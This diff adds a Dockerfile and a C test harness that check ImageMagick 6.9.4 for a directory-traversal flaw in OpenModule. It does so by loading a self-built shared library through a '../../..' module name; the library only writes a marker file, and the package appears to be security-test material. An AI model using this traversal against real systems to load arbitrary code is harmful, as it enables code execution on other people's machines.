diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..0735b91
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,27 @@
+FROM ubuntu:20.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update package lists and install build-essential and dependencies
+RUN apt-get -y update && \
+    apt-get install -y build-essential curl unzip wget libtool pkg-config libltdl-dev && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the project files into the container
+COPY . /project
+
+# Set the working directory inside the container
+WORKDIR /project
+
+# Build ImageMagick
+RUN ./configure --with-modules --enable-shared && \
+    make && \
+    make install && \
+    ldconfig
+
+# Compile and run the test setup program
+RUN gcc -o test_vulnerability test_vulnerability.c && \
+    ./test_vulnerability
+
+# Run the test script
+CMD ["/tmp/test_script.sh"]
diff --git a/test_vulnerability.c b/test_vulnerability.c
new file mode 100644
index 0000000..f302af7
--- /dev/null
+++ b/test_vulnerability.c
@@ -0,0 +1,105 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+// Function to create a simple shared library that will be used as our test module
+void create_test_module(const char *path) {
+    FILE *fp = fopen(path, "w");
+    if (fp == NULL) {
+        fprintf(stderr, "Failed to create test module at %s\n", path);
+        exit(1);
+    }
+    
+    // Write a simple shared library with the required functions
+    fprintf(fp, "#include <stdio.h>\n");
+    fprintf(fp, "#include <stdlib.h>\n\n");
+    fprintf(fp, "// This function will be called when the module is loaded\n");
+    fprintf(fp, "size_t RegisterTESTImage(void) {\n");
+    fprintf(fp, "    FILE *fp = fopen(\"/tmp/vulnerability_confirmed\", \"w\");\n");
+    fprintf(fp, "    if (fp) {\n");
+    fprintf(fp, "        fprintf(fp, \"Vulnerability confirmed\\n\");\n");
+    fprintf(fp, "        fclose(fp);\n");
+    fprintf(fp, "    }\n");
+    fprintf(fp, "    return 0x4D61676B; // Magic signature\n");
+    fprintf(fp, "}\n\n");
+    fprintf(fp, "void UnregisterTESTImage(void) {\n");
+    fprintf(fp, "}\n");
+    
+    fclose(fp);
+}
+
+int main() {
+    // Create a directory outside the project directory
+    system("mkdir -p /tmp/imagemagick_test");
+    
+    // Create a test module source file
+    create_test_module("/tmp/imagemagick_test/test_module.c");
+    
+    // Compile the test module
+    system("cd /tmp/imagemagick_test && gcc -shared -fPIC -o test.so test_module.c");
+    
+    // Remove any previous test results
+    system("rm -f /tmp/vulnerability_confirmed");
+    
+    // Create a simple script to test the vulnerability
+    FILE *script = fopen("/tmp/test_script.sh", "w");
+    if (!script) {
+        perror("Failed to create test script");
+        return 1;
+    }
+    
+    fprintf(script, "#!/bin/bash\n");
+    fprintf(script, "export MAGICK_CODER_MODULE_PATH=/usr/local/lib/ImageMagick-6.9.4/modules-Q16/coders\n");
+    fprintf(script, "cd /project\n");
+    
+    // Create a C program that directly calls OpenModule
+    fprintf(script, "cat > /tmp/direct_test.c << 'EOF'\n");
+    fprintf(script, "#include <stdio.h>\n");
+    fprintf(script, "#include <stdlib.h>\n");
+    fprintf(script, "#include <magick/MagickCore.h>\n\n");
+    fprintf(script, "int main() {\n");
+    fprintf(script, "    ExceptionInfo *exception;\n");
+    fprintf(script, "    MagickBooleanType status;\n\n");
+    fprintf(script, "    // Initialize ImageMagick\n");
+    fprintf(script, "    MagickCoreGenesis(NULL, MagickTrue);\n");
+    fprintf(script, "    exception = AcquireExceptionInfo();\n\n");
+    fprintf(script, "    // Set the environment variable to include a base directory\n");
+    fprintf(script, "    setenv(\"MAGICK_CODER_MODULE_PATH\", \"/usr/local/lib/ImageMagick-6.9.4/modules-Q16/coders\", 1);\n\n");
+    fprintf(script, "    printf(\"Testing directory traversal vulnerability...\\n\");\n\n");
+    fprintf(script, "    // Attempt to load a module with a path traversal\n");
+    fprintf(script, "    const char *module_name = \"../../../../../../../../../tmp/imagemagick_test/test\";\n\n");
+    fprintf(script, "    printf(\"Module name: %s\\n\", module_name);\n\n");
+    fprintf(script, "    // This should fail if the vulnerability is fixed, and succeed if it exists\n");
+    fprintf(script, "    status = OpenModule(module_name, exception);\n\n");
+    fprintf(script, "    if (status == MagickTrue) {\n");
+    fprintf(script, "        printf(\"VULNERABILITY DETECTED: Successfully loaded module from outside directory\\n\");\n");
+    fprintf(script, "        return 1; // Exit with error code to indicate vulnerability exists\n");
+    fprintf(script, "    } else {\n");
+    fprintf(script, "        printf(\"Module loading failed: %s\\n\", exception->reason ? exception->reason : \"Unknown reason\");\n");
+    fprintf(script, "        printf(\"Test PASSED (vulnerability does not exist)\\n\");\n");
+    fprintf(script, "        return 0; // Exit with success code to indicate vulnerability does not exist\n");
+    fprintf(script, "    }\n");
+    fprintf(script, "}\n");
+    fprintf(script, "EOF\n");
+    
+    // Compile and run the direct test
+    fprintf(script, "gcc -o /tmp/direct_test /tmp/direct_test.c -I/usr/local/include/ImageMagick-6 -L/usr/local/lib -lMagickCore-6.Q16\n");
+    fprintf(script, "/tmp/direct_test\n");
+    fprintf(script, "DIRECT_TEST_RESULT=$?\n");
+    
+    // Check if the vulnerability was confirmed by either method
+    fprintf(script, "if [ -f /tmp/vulnerability_confirmed ] || [ $DIRECT_TEST_RESULT -eq 1 ]; then\n");
+    fprintf(script, "  echo \"VULNERABILITY DETECTED: Successfully loaded module from outside directory\"\n");
+    fprintf(script, "  exit 1 # Exit with error code to indicate vulnerability exists\n");
+    fprintf(script, "else\n");
+    fprintf(script, "  echo \"Test PASSED (vulnerability does not exist)\"\n");
+    fprintf(script, "  exit 0 # Exit with success code to indicate vulnerability does not exist\n");
+    fprintf(script, "fi\n");
+    
+    fclose(script);
+    system("chmod +x /tmp/test_script.sh");
+    
+    printf("Test setup complete. Run the test script to check for the vulnerability.\n");
+    return 0;
+}
